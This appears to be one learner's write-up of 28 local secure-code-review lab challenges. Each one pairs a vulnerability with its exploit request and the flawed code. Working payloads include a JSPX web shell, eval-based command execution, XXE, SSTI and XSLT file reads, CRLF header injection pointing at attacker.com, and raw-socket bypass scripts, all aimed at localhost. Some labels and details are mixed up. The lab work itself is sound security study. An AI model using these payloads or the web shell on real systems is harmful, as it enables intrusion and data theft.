CodeReview
--Challenge01--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-01>python main.py
Vulnerability: Open Redirect
Exploit:
GET /?redirect_url=https://google.com HTTP/1.1
Host: 127.0.0.1:5000
Vulnerable Code:
redirect_url = request.args.get('redirect_url')
if redirect_url:
    logging.info(f'Redirecting to: {redirect_url}')
    return redirect(redirect_url)
The application contains an open redirect vulnerability in the handling of the redirect_url parameter. However, in the current code state, the vulnerable branch is not reachable because is_authenticated_user() is unimplemented and always returns None, causing all requests to be redirected to /login.

--Challenge02--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-02>node main.js
Vulnerability: SSRF (Server-Side Request Forgery)
Exploit:
GET /fetch-data?url=https://www.google.com HTTP/1.1
Host: 127.0.0.1:3000
Vulnerable Code:
const url = req.query.url;

try {
    const response = await axios.get(url);
    res.send(response.data);
The application accepts a user-controlled url parameter and uses it directly in axios.get() without validation. This allows an attacker to force the server to make arbitrary HTTP requests, resulting in a Server-Side Request Forgery (SSRF) vulnerability.

--Challenge03--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-03>mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=8081"
Vulnerability: Broken Access Control, Sensitive Data Exposure, Insecure Password Hashing (MD5, unsalted)
Exploit:
POST /register HTTP/1.1
Host: 127.0.0.1:8081
username=admin&password=Password123

POST /login HTTP/1.1
Host: 127.0.0.1:8081
username=admin&password=Password123

GET /admin/usernames HTTP/1.1
Host: 127.0.0.1:8081

{"admin":"42F749ADE7F9E195BF475F37A44CAFCB"}
Crack password 
Hash	Type	Result
42F749ADE7F9E195BF475F37A44CAFCB	md5	Password123

Vulnerable Code:
@GetMapping("/admin/usernames")
public Map<String, String> getAllUsernames() {
    return userDatabase;
}
private String hashPassword(String password) {
    try {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(password.getBytes());
        byte[] digest = md.digest();
        return DatatypeConverter.printHexBinary(digest).toUpperCase();
    } catch (NoSuchAlgorithmException e) {
        return "Error: Hashing algorithm not found";
    }
}
The application exposes an /admin/usernames endpoint that returns the entire in-memory user database without any authentication or authorization checks. This allows any user to retrieve all usernames and their corresponding password hashes.
Additionally, passwords are hashed using unsalted MD5, which is not suitable for password storage due to its speed and known cryptographic weaknesses.

--Challenge04--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-04>python main.py
Vulnerability: Hardcoded Credentials
Exploit:
POST /login HTTP/1.1
Host: 127.0.0.1:5000
username=admin&password=mypassword
Vulnerable Code:
USERNAME = "admin"
PASSWORD = "mypassword"
if username == USERNAME and password == PASSWORD:
    return "Login successful!"
The application uses credentials hardcoded directly in the source code. Anyone with access to the code can recover the valid username and password and authenticate successfully.
This is insecure because secrets should never be embedded in application code.

--Challenge05--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-05>mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=8081"
Vulnerability: XML External Entity (XXE) — Improper Mitigation
Exploit:
POST /process HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded
inputXml=<%3fxml+version%3d"1.0"%3f><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+"file%3a///C%3a/Windows/System32/drivers/etc/hosts">]><root>%26xxe%3b</root>
Vulnerable Code:
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Prevent XXE attacks
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setXIncludeAware(false);

DocumentBuilder builder = dbf.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(inputXml)));
The application processes user-controlled XML input and attempts to prevent XXE attacks by disabling DOCTYPE declarations. However, the protection is incomplete because other critical features related to external entity resolution are not disabled.
This misconfiguration may allow XXE attacks under certain parser behaviors or bypass techniques.

--Challenge06--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-06>go run main.go
Vulnerability: Reflected Cross-Site Scripting (XSS)
Exploit: 
GET /greet?name=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: 127.0.0.1:8081
Vulnerable Code:
name := r.URL.Query().Get("name")
response := fmt.Sprintf("<html><body><h1>Hello, %s!</h1></body></html>", name)
fmt.Fprint(w, response)
The application reads user-controlled input from the name query parameter and inserts it directly into an HTML response without output encoding or sanitization.
Because the value is reflected into the page as raw HTML, an attacker can inject JavaScript that executes in the victim’s browser.

--Challenge07--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-07>node main.js
Vulnerability: Host Header Injection → Password Reset Poisoning
Exploit:
POST /reset-password HTTP/1.1
Host: 4tyfsqvzedzx3vd3whrbgkcn2e85w4kt.oastify.com
Content-Type: application/json
{"email":"test@example.com"}
Vulnerable Code:
const resetLink = `http://${req.headers.host}/reset-password?token=generatedToken123`;
The application constructs a password reset link using the Host header, which is user-controlled. This allows an attacker to manipulate the reset link sent to users.

--Challenge08--
Execution: C:\Users\jesus.gavancho\Downloads\nginx-1.28.3\nginx-1.28.3>nginx -t
C:\Users\jesus.gavancho\Downloads\nginx-1.28.3\nginx-1.28.3>start nginx
Vulnerability: Path Traversal via Nginx alias misconfiguration
Exploit:
GET /html../conf/nginx.conf HTTP/1.1
Host: 127.0.0.1
Vulnerable Code:
location /html {
    alias /usr/share/nginx/html/;
}
The application uses the Nginx alias directive without proper trailing slash handling. This allows path traversal using crafted paths such as /html../, enabling access to files outside the intended directory.

--Challenge09--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-09>python main.py
Vulnerability: Insecure Direct Object Reference (IDOR) / Broken Access Control
Exploit:
POST /edit-profile HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded
username=testuser
Vulnerable Code:
username = request.form.get('username')
user_profile = user_profile_service.get_user_profile(username)

if user_profile and user_profile.get_username() == username:
    return user_profile_service.update_user_profile(user_profile)
The application allows users to update profiles based solely on a user-controlled username parameter. There is no verification that the authenticated user owns the profile being modified.

--Challenge10--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-10>node main.js
Vulnerability: JWT Authentication Bypass (Improper Verification)
GET /admin HTTP/1.1
Host: 127.0.0.1:3000
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzc0NDkwODgzLCJleHAiOjE3NzQ0OTQ0ODN9.bUzD4NwbAxMvBKrV-L4c8IT3RYU8CgL2o2-t8HyhksA
Exploit:
Vulnerable Code:
const decoded = jwt.decode(token, { complete: true });
req.decoded = decoded.payload;
The application uses jwt.decode() instead of jwt.verify(), meaning the token signature is never validated. An attacker can forge arbitrary tokens and impersonate any user.

--Challenge11--
Execution: C:\Users\jesus.gavancho\Downloads\nginx-1.28.3\nginx-1.28.3>start nginx
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-11>python main.py
Vulnerability: Access Control Bypass via Nginx/Flask Path Parsing Discrepancy
Exploit:
Not working on burpsuite
Burp Suite could not reliably reproduce the exploit because the bypass requires sending raw non-printable bytes (0x85 and 0xA0) directly in the request path. Standard browser and Burp request editors normalize or reject these characters, so a raw socket script was required.
C:\Users\jesus.gavancho\Downloads>type test85.py
import socket

host = "127.0.0.1"
port = 80

req = b"GET /admin\x85 HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"

s = socket.socket()
s.connect((host, port))
s.sendall(req)

resp = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk
s.close()

print(resp.decode("latin-1", errors="replace"))
C:\Users\jesus.gavancho\Downloads>python test85.py
HTTP/1.1 200 OK
Server: nginx/1.28.3
Date: Thu, 26 Mar 2026 02:27:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 20
Connection: close

Admin area accessed!
C:\Users\jesus.gavancho\Downloads>type testa0.py
import socket

host = "127.0.0.1"
port = 80

req = b"GET /admin\xa0 HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"

s = socket.socket()
s.connect((host, port))
s.sendall(req)

resp = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    resp += chunk
s.close()

print(resp.decode("latin-1", errors="replace"))
C:\Users\jesus.gavancho\Downloads>python testa0.py
HTTP/1.1 200 OK
Server: nginx/1.28.3
Date: Thu, 26 Mar 2026 02:37:29 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 20
Connection: close

Admin area accessed!
Vulnerable Code:
@app.route('/admin')
def admin():
    return "Admin area accessed!"
location = /admin {
    deny all;
}

location / {
    proxy_pass http://127.0.0.1:5000;
}
An attacker can bypass reverse-proxy access control and reach the admin functionality without authorization.

--Challenge12--
Execution: ┌──(witty㉿WITTY)-[~/secure-code-review-challenges/challenge-12]
└─$ python main.py
Vulnerability: Authentication Bypass via Bash Wildcard Pattern Matching
Exploit: 
POST /admin HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json
{
"password":"*"
}
Vulnerable Code:
# Call the bash script with the password as an argument
        result = subprocess.run(
            ['./validate_password.sh', password],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
SECURE_PASSWORD="SuperAdmin@123"

if [[ $SECURE_PASSWORD == $1 ]]; then
    echo "true"
else
    echo "false"
fi
The password validation logic compares a hardcoded password against user-controlled input using Bash's [[ ... == ... ]] syntax with the attacker-controlled operand unquoted. In Bash, the right-hand side is treated as a pattern, so wildcard values such as * match any string and bypass authentication.

--Challenge13--
Execution: This code is part of a Spring Boot controller and requires a full project with database configuration to run.
Vulnerability: SQL Injection
Exploit:
GET /users?orderBy=CASE%20WHEN%201=1%20THEN%20username%20ELSE%20id%20END HTTP/1.1
Host: 127.0.0.1:8080
Vulnerable Code:
@GetMapping("/users")
public List<Map<String, Object>> getUsers(@RequestParam String orderBy) {
    String query = "SELECT * FROM users ORDER BY " + orderBy;
    return jdbcTemplate.queryForList(query);
}
The application takes the user-controlled orderBy parameter and concatenates it directly into an SQL query. Since the value is not validated or restricted to a safe allowlist, an attacker can manipulate the SQL statement.

--Challenge14--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-14>node main.js
Vulnerability: Race Condition (TOCTOU - Time Of Check To Time Of Use)
Exploit:
Create a new tab (20 requests) > send group (parallel)
POST /transfer HTTP/1.1
Host: 127.0.0.1:3000
{"from":1,"to":2,"amount":100}
Checking: http://127.0.0.1:3000/balance/2 {"balance":3100}
http://127.0.0.1:3000/balance/1 {"balance":-1100}
Vulnerable Code:
db.get("SELECT balance FROM accounts WHERE id = ?", [from], (err, row) => {
  if (row.balance < amount) return res.status(400).json({ message: 'Insufficient funds' });

  db.run("UPDATE accounts SET balance = balance - ? WHERE id = ?", [amount, from], (err) => {
    db.run("UPDATE accounts SET balance = balance + ? WHERE id = ?", [amount, to], (err) => {
      res.status(200).json({ message: 'Transfer successful' });
    });
  });
});
The application performs a balance check and update in separate operations without synchronization or transaction control. This allows multiple concurrent requests to pass validation using the same initial balance.

--Challenge15--
Execution: C:\Users\jesus.gavancho\Downloads\nginx-1.28.3\nginx-1.28.3>nginx -t
C:\Users\jesus.gavancho\Downloads\nginx-1.28.3\nginx-1.28.3>start nginx
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-15>python main.py
Vulnerability: HTTP Response Splitting via CRLF Injection in the Nginx redirect logic
Exploit:
location /payment {
            return 302 http://payment-api$uri;
        }
Vulnerable Code:
GET /payment/%0d%0aSet-Cookie:%20session=attacker HTTP/1.1
Host: 127.0.0.1
GET /payment/%0d%0aLocation:%20https://attacker.com HTTP/1.1
Host: 127.0.0.1
Response: Location: https:/attacker.com
GET /payment/%0d%0aContent-Security-Policy:%20default-src%20* HTTP/1.1
Host: 127.0.0.1
Response: Content-Security-Policy: default-src *
The vulnerability occurs because the application uses untrusted request URI data inside an HTTP response header. Since $uri is derived from user input and is directly concatenated into the Location header, an attacker can supply CRLF characters to break the header line and inject arbitrary additional headers into the server response.

--Challenge16--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-16\target>copy Challenge16.war C:\Users\jesus.gavancho\Downloads\apache-tomcat-9.0.116-windows-x64\apache-tomcat-9.0.116\webapps
C:\Users\jesus.gavancho\Downloads\apache-tomcat-9.0.116-windows-x64\apache-tomcat-9.0.116\bin>startup.bat
Vulnerability: Unrestricted File Upload leading to Remote Code Execution (RCE) through an incomplete extension filter
Exploit:
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-16>type shell.jspx
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0">
<jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/>
<jsp:directive.page import="java.util.*"/>
<jsp:directive.page import="java.io.*"/>
<jsp:scriptlet><![CDATA[
        String tmp = pageContext.getRequest().getParameter("cmd");
        if (tmp != null&&!"".equals(tmp)) {
        try{
                Process p = Runtime.getRuntime().exec(tmp);
                InputStream in = p.getInputStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(in,"GBK"));
                String brs = br.readLine();
                while(brs!=null){
                        out.println(brs+"</br>");
                        brs = br.readLine();
                }
                }catch(Exception ex){
                        out.println(ex.toString());
                }
        }]]>
</jsp:scriptlet>
</jsp:root>
POST /Challenge16/upload HTTP/1.1
Host: 127.0.0.1:8081
Content-Disposition: form-data; name="file"; filename="shell.jspx"
Content-Type: application/octet-stream
....
GET /Challenge16/uploads/shell.jspx?cmd=whoami HTTP/1.1
Host: 127.0.0.1:8081
Response: info\jesus.gavancho</br>
GET /Challenge16/uploads/shell.jspx?cmd=cmd%20/c%20dir HTTP/1.1
Host: 127.0.0.1:8081
Response: Volume in drive C is Windows</br>
 Volume Serial Number is 3CAF-15E7</br>
</br>
 Directory of C:\Users\jesus.gavancho\Downloads\apache-tomcat-9.0.116-windows-x64\apache-tomcat-9.0.116\bin</br>
</br>
03/26/2026  01:03 PM    <DIR>          .</br>
03/26/2026  01:03 PM    <DIR>          ..</br>
03/26/2026  01:03 PM            35,759 bootstrap.jar</br>
03/26/2026  01:03 PM             1,703 catalina-tasks.xml</br>
03/26/2026  01:03 PM            17,521 catalina.bat</br>
03/26/2026  01:03 PM            25,909 catalina.sh</br>
GET /Challenge16/uploads/shell.jspx?cmd=powershell%20-c%20whoami HTTP/1.1
Host: 127.0.0.1:8081
Vulnerable Code:
Part filePart = request.getPart("file");
String fileName = filePart.getSubmittedFileName();

if (fileName.toLowerCase().endsWith(".jsp")) {
    response.setContentType("text/html");
    PrintWriter out = response.getWriter();
    out.println("<html><body><h2>Error: .jsp files are not allowed!</h2><p><a href=\"/\">Go back</a></p></body></html>");
    return;
}

String uploadDir = getServletContext().getRealPath("") + File.separator + "uploads";
File uploadDirFile = new File(uploadDir);
if (!uploadDirFile.exists()) {
    uploadDirFile.mkdir();
}

File file = new File(uploadDir, fileName);
try (InputStream fileContent = filePart.getInputStream();
    FileOutputStream outputStream = new FileOutputStream(file)) {
    byte[] buffer = new byte[1024];
    int bytesRead;
    while ((bytesRead = fileContent.read(buffer)) != -1) {
        outputStream.write(buffer, 0, bytesRead);
    }
}
The file upload protection is based only on a blacklist check for .jsp filenames. This is insufficient because Java web containers may also execute related extensions such as .jspx. Since the application does not validate file content, does not use a strict allowlist, and stores uploaded files inside the web-accessible application directory, an attacker can upload a malicious server-side script and execute it directly through the browser.

--Challenge17--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-17>go run main.go
Vulnerability: Command Injection via unsanitized user input passed to a shell command
Exploit:
GET /ping?ip=127.0.0.1%26whoami HTTP/1.1
Host: 127.0.0.1:5000
Response: Ping statistics for 127.0.0.1:
    Packets: Sent = 3, Received = 3, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
info\jesus.gavancho
Vulnerable Code:
func pingHandler(w http.ResponseWriter, r *http.Request) {
        query := r.URL.Query()
        ip := query.Get("ip")

        if ip == "" {
                http.Error(w, "Please provide an IP address", http.StatusBadRequest)
                return
        }

        cmd := exec.Command("cmd", "/c", fmt.Sprintf("ping -n 3 %s", ip))
        output, err := cmd.CombinedOutput()
        if err != nil {
                http.Error(w, fmt.Sprintf("Error executing command: %v", err), http.StatusInternalServerError)
                return
        }

        w.WriteHeader(http.StatusOK)
        w.Write(output)
}
The application accepts user-controlled input and inserts it directly into a shell command executed with sh -c. Since no validation or escaping is performed, an attacker can break out of the intended ping argument and append additional commands. This is a classic OS command injection vulnerability.

--Challenge18--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-18>C:\Users\jesus.gavancho\Downloads\php-8.5.4-nts-Win32-vs17-x64\php.exe -S 127.0.0.1:8000 main.php
Vulnerability: PHP Insecure Deserialization leading to Privilege Escalation
Exploit:
POST / HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
data=O:4:"User":2:{s:8:"username";s:5:"jesus";s:4:"role";s:5:"admin";}&submit=1
Vulnerable Code:
if (isset($_POST['submit'])) {
    $data = $_POST['data'];
    $user = @unserialize($data);
    if ($user === false && $data !== 'b:0;') {
        echo "Failed to unserialize user. ";
    } else {
        $_SESSION['user'] = $user;
    }
}

function isAdmin() {
    if (isset($_SESSION['user']) && $_SESSION['user'] instanceof User) {
        return $_SESSION['user']->role === 'admin';
    }
    return false;
}
The application deserializes untrusted input without validation, integrity protection, or class restrictions. Because authorization is based on properties of the deserialized object, an attacker can craft a serialized User instance with arbitrary values and escalate privileges without legitimate authentication.

--Challenge19--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-19>go run main.go
Vulnerability: Server-Side Template Injection (SSTI) with arbitrary file read
Exploit:
GET /?tmpl={{ReadUserFile%20"main.go"}} HTTP/1.1
Host: 127.0.0.1:5000
Response: package main

import (
	&#34;html/template&#34;
	&#34;log&#34;
	&#34;net/http&#34;
	&#34;os&#34;
)...
GET /?tmpl={{ReadUserFile%20"C:/Windows/win.ini"}} HTTP/1.1
Host: 127.0.0.1:5000
GET /?tmpl={{.Email}}%20-%20{{.Password}} HTTP/1.1
Host: 127.0.0.1:5000
Response: test@example.com - Password123!
Vulnerable Code:
func handler(w http.ResponseWriter, r *http.Request) {
        user := &User{Email: "test@example.com", Password: "Password123!"}
        tmpl := r.URL.Query().Get("tmpl")

        funcs := template.FuncMap{
                "ReadUserFile": func(filename string) string {
                        return user.ReadUserFile(filename)
                },
        }

        t, err := template.New("page").Funcs(funcs).Parse(tmpl)
        if err != nil {
                http.Error(w, err.Error(), http.StatusInternalServerError)
                return
        }

        if err = t.Execute(w, user); err != nil {
                http.Error(w, err.Error(), http.StatusInternalServerError)
        }
}
The application takes untrusted user input from the tmpl parameter and parses it as a server-side Go template. This gives the attacker direct control over template expressions executed on the server. Since the template context includes a User object and also exposes a custom function capable of reading files, an attacker can access sensitive in-memory data and read arbitrary files from the filesystem.

--Challenge20--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-20>mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=8081"
Vulnerability: Path Traversal (Directory Traversal) via unsanitized filename parameter
Exploit:
GET /files/download?filename=../../../../Windows/win.ini HTTP/1.1
Host: 127.0.0.1:8081
Response: ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
Vulnerable Code:
private final String fileBasePath = "/var/www/uploads/";

@GetMapping("/download")
public ResponseEntity<Resource> downloadFile(@RequestParam String filename) throws IOException {
    Path filePath = Paths.get(fileBasePath + filename);

    if (!Files.exists(filePath)) {
        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(null);
    }

    Resource fileResource = new UrlResource(filePath.toUri());
    return ResponseEntity.ok()
            .contentType(MediaType.APPLICATION_OCTET_STREAM)
            .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + fileResource.getFilename() + "\"")
            .body(fileResource);
}
The application trusts user input (filename) and directly uses it to construct file system paths without validation. This allows attackers to traverse directories using ../ sequences and access files outside the intended upload directory. The absence of path normalization and boundary checks enables arbitrary file read.

--Challenge21--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-21>node main.js
Vulnerability: CORS Misconfiguration with Credentialed Cross-Origin Requests
Exploit:
GET /api-key HTTP/1.1
Host: 127.0.0.1:3000
Origin: http://og802wrrfq0zh0q67rv2657e95fw3mrb.oastify.com
Cookie: auth=admin
Response: Access-Control-Allow-Origin: http://og802wrrfq0zh0q67rv2657e95fw3mrb.oastify.com
{"data":"<some-secret-API-key>"}
Vulnerable Code:
app.use((req, res, next) => {
    const origin = req.get('Origin');
    if (origin) {
        res.header('Access-Control-Allow-Origin', origin);
        res.header('Access-Control-Allow-Credentials', 'true');
    }
    next();
});

app.get('/api-key', (req, res) => {
    const username = req.cookies.auth;

    if (username && users[username]) {
        return res.status(200).json({ data: users[username].apiKey });
    }

    return res.status(403).json({ message: 'Unauthorized access!' });
});
The application dynamically trusts any supplied Origin header and enables Access-Control-Allow-Credentials: true. This is dangerous because browsers only allow credentialed cross-origin responses to be read when the server explicitly permits the requesting origin. Since the server reflects arbitrary origins, any attacker-controlled website can make authenticated requests on behalf of the victim and read the response data.

--Challenge22--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-22>node main.js
Vulnerability: Remote Code Execution (RCE) via unsafe use of eval()
Exploit:
POST /process-data HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
{
  "data": "require('child_process').execSync('whoami').toString()"
}
Response: {"result":"info\\jesus.gavancho\r\n"}
Vulnerable Code:
app.post('/process-data', (req, res) => {
    const { data } = req.body;

    try {
        const result = eval(data);
        res.send({ result });
    } catch (err) {
        res.status(400).send({ error: 'Invalid data' });
    }
});
The application directly evaluates user-supplied input using eval().
This allows an attacker to execute arbitrary JavaScript code on the server.
Since Node.js provides access to system-level modules like child_process, an attacker can escalate this to full system command execution.

--Challenge23--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-23>mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=8081"
Vulnerability: Unsafe Reflection / Class Loading controlled by user input
Exploit:
GET /custom-hello?user=com.example.demoapp.AdminUser HTTP/1.1
Host: 127.0.0.1:8081
Response: Hello! You're an admin!
Vulnerable Code:
@GetMapping("/custom-hello")
public String customHello(@RequestParam String user) {
    try {
        Class<?> clazz = Class.forName(user);
        Method method = clazz.getMethod("sayHello");
        Object instance = clazz.getDeclaredConstructor().newInstance();
        Object result = method.invoke(instance);

        return result.toString();
    } catch (Exception e) {
        return "Error invoking method: " + e.getMessage();
    }
}
Because there is no allowlist or authorization check, an attacker can choose internal classes that were not intended to be reachable through this endpoint, such as AdminUser.
This is a classic unsafe reflection issue that leads to authorization bypass and potentially broader abuse depending on what classes exist in the classpath.

--Challenge24--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-24>python app.py
Vulnerability: Arbitrary XSLT Injection leading to Local File Read
Exploit:
POST /parse-xslt HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoK3MDiHJNKrc6COo
------WebKitFormBoundaryoK3MDiHJNKrc6COo
Content-Disposition: form-data; name="xslt_file"; filename="exploit-read-file.xslt"
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dtd_sample>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('file:///C:/Windows/win.ini', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
------WebKitFormBoundaryoK3MDiHJNKrc6COo--
Response: <?xml version="1.0" encoding="UTF-8"?>; for 16-bit app support&#xD;
[fonts]&#xD;
[extensions]&#xD;
[mci extensions]&#xD;
[files]&#xD;
[Mail]&#xD;
MAPI=1&#xD;
Vulnerable Code:
@app.route('/parse-xslt', methods=['POST'])
def parse_xslt():
    try:
        if 'xslt_file' not in request.files:
            return 'No file part', 400

        xslt_file = request.files['xslt_file']
        xslt_content = xslt_file.read()

        with PySaxonProcessor(license=False) as proc:
            xsltproc = proc.new_xslt30_processor()
            xsltproc.set_cwd('.')
            transformer = xsltproc.compile_stylesheet(stylesheet_text=xslt_content.decode())

            with open('./resources/some.xml', 'rb') as xml_file:
                xml_content = xml_file.read()

            document = proc.parse_xml(xml_text=xml_content.decode('utf-8'))
            output = transformer.transform_to_string(xdm_node=document)

            if not output:
                return "Successful but no output"

            return output
    except Exception as e:
        print(f"Error processing XSLT: {str(e)}")
        return str(e), 500
The application accepts an arbitrary XSLT file from the user and compiles it directly:In XSLT, functions like doc() and unparsed-text() can be abused to access local files or remote URLs, depending on processor configuration. Since the application does not restrict dangerous XSLT features, an attacker may use the uploaded stylesheet to: read local files, make server-side requests to internal services, extract sensitive data from the host or network.

--Challenge25--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-25>go mod init challenge-25
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-25>go mod tidy
Start Docker Desktop manually from Windows and wait until it says it is running.
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-25>docker run -d -p 27017:27017 --name mongo mongo
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-25>go run main.go
Vulnerability: MongoDB NoSQL Injection via attacker-controlled query object
Exploit:
POST /login HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/json
{"username":{"$ne":null},"password":{"$ne":null}}
Response: Login successful
Vulnerable Code:
func login(w http.ResponseWriter, r *http.Request) {
        var creds map[string]interface{}
        if json.NewDecoder(r.Body).Decode(&creds) != nil {
                http.Error(w, "Invalid request", http.StatusBadRequest)
                return
        }

        users := client.Database("testdb").Collection("users")
        if users.FindOne(context.TODO(), creds).Err() != nil {
                http.Error(w, "Invalid credentials", http.StatusUnauthorized)
                return
        }

        w.Write([]byte("Login successful"))
}
The application accepts user input as a generic JSON object (map[string]interface{}) and directly uses it as a MongoDB query filter. This allows an attacker to inject MongoDB query operators (such as $ne, $gt, or $regex) instead of simple string values, effectively manipulating how the database performs the lookup.
As a result, authentication logic can be bypassed by crafting queries that always evaluate to true (e.g., using $ne: null), causing the database to return a valid user without requiring correct credentials.

--Challenge26--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-26>npm install express body-parser cookie-parser
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-26>node main.js
Vulnerability: Prototype Pollution leading to privilege escalation
Exploit:
POST /update-profile HTTP/1.1
Host: 127.0.0.1:3000
Cookie: username=guest
Content-Type: application/json
Content-Length: 48

{
  "__proto__": {
    "isAdmin": true
  }
}
After that
GET /admin HTTP/1.1
Host: 127.0.0.1:3000
Response: Welcome, Admin!
Vulnerable Code:
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];
    }
}

app.post("/update-profile", (req, res) => {
    let username = req.cookies.username;
    if (!username || !users[username]) {
        return res.status(401).json({ error: "Unauthorized" });
    }

    let user = users[username];
    merge(user, req.body);

    res.json({ message: "Profile updated", user });
});
The application merges user-controlled JSON into an existing user object without filtering dangerous keys such as __proto__, constructor, or prototype. Because JavaScript objects inherit from prototypes, an attacker can abuse this behavior to pollute the prototype chain and inject properties that were never intended to exist on normal user objects.
As a result, the attacker can set isAdmin = true through prototype pollution and then access /admin, which only checks whether the current user object has a truthy isAdmin property. This leads to privilege escalation from guest to admin.

--Challenge27--
Execution: INFO+jesus.gavancho@WITTY MINGW64 /c/Users/jesus.gavancho/Downloads/secure-code-review-challenges/challenge-27
$ gcc main.c -o app.exe
INFO+jesus.gavancho@WITTY MINGW64 /c/Users/jesus.gavancho/Downloads/secure-code-review-challenges/challenge-27
$ ./app.exe
Vulnerability: Integer Overflow leading to logic bypass (price manipulation)
Exploit:
INFO+jesus.gavancho@WITTY MINGW64 /c/Users/jesus.gavancho/Downloads/secure-code-review-challenges/challenge-27
$ ./app.exe
Enter quantity of items: 2147483648
Your entered quantity: 2147483648
Fixed price per item is: 1 euro
Total price: -2147483648 euros
Vulnerable Code:
unsigned int total_u = quantity * (unsigned int) FIXED_PRICE;
int total_s = (int) total_u;
The application reads a user-controlled quantity as an unsigned integer and calculates the total price using integer arithmetic. However, the result is later cast to a signed integer (int) without validating whether the value exceeds the signed integer range.
Because of this, large input values can cause an integer overflow when converting from unsigned int to int, resulting in negative or incorrect totals. This breaks the integrity of the price calculation and allows attackers to manipulate the final amount displayed.

--Challenge28--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-28>node main.js
Vulnerability: Web Cache Deception due to wildcard route matching sensitive content
Exploit:
POST /login HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
username=admin&password=password
Recieved Response: Set-Cookie: connect.sid=s%3AHKrkuIQ1VCH9bXrx38fqXPircmspGM7k.8jAbx7XXzBdF1v9tLSm4mMIN0oUba8rRegaubS%2BtfFA; Path=/; HttpOnly
After that
GET /profile/test.css HTTP/1.1
Host: localhost:5000
Cookie: connect.sid=s%3AHKrkuIQ1VCH9bXrx38fqXPircmspGM7k.8jAbx7XXzBdF1v9tLSm4mMIN0oUba8rRegaubS%2BtfFA
Response: admin - API Key: API-KEY-1234567890-SECRET
If a caching layer such as Nginx is configured to cache static-looking files like .css, it may store the response containing the admin API key. An attacker can then request the same URL later and receive the cached sensitive content without being authenticated.
Vulnerable Code:
